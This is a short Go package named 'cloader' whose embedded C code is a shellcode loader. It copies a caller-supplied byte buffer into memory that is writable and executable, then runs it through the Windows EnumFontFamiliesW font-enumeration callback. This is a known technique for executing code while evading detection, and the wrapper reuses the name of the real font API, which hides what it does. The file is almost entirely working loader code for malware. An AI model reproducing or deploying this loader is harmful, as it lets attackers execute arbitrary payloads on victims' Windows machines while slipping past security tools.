package cloader

/*
#cgo LDFLAGS: -lgdi32
#include <windows.h>

void enumFontFamiliesW(uintptr_t p, int len) {
    LPVOID addr = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (addr) {
        RtlMoveMemory(addr, (void*)p, len);
 		HDC dc = GetDC(0);
    	EnumFontFamiliesW(dc, 0, (FONTENUMPROCW)addr, 0);
        VirtualFree(addr, 0, MEM_RELEASE);
    }
}
*/
import "C"
import "unsafe"

func EnumFontFamiliesW(p []byte) {
	C.enumFontFamiliesW((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
